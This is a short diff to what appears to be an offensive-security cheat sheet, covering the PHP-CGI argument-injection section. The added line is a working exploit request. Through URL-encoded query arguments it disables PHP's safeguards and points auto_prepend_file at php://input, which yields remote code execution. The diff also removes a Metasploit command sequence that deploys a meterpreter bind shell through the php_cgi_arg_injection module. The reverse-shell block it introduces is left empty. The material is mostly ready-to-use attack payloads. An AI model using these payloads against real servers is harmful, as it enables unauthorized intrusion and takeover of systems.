@@ -61,18 +61,12 @@ http://vulnerable/?-s
 
 _Exploitation:_
 ```
-# Enable allow_url_include=1
-http://vulnerable/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
+POST /?-%64+allow_url_include%3dOn+-%64+safe_mode%3d0+-d+suhosin.simulation%3d1+--define+disable_functions%3d%22%22+-%64+open_basedir%3dnone+-%64+auto_prepend_file%3dphp://input+--define+cgi.force_redirect%3d0+--define+cgi.redirect_status_env%3d0+-%6e HTTP/1.1
 ```
 
-_Meterpreter TCP Bind_
+_POST Body Reverse TCP Shell_
 ```
-msfconsole
-use exploit/multi/http/php_cgi_arg_injection
-set rhost [URL]
-set rhost [HOST_IP]
-set PAYLOAD php/meterpreter/bind_tcp
-exploit
+
 ```
 
 **PHF CGI Remote Command Execution - [CVE-1999-0067]**
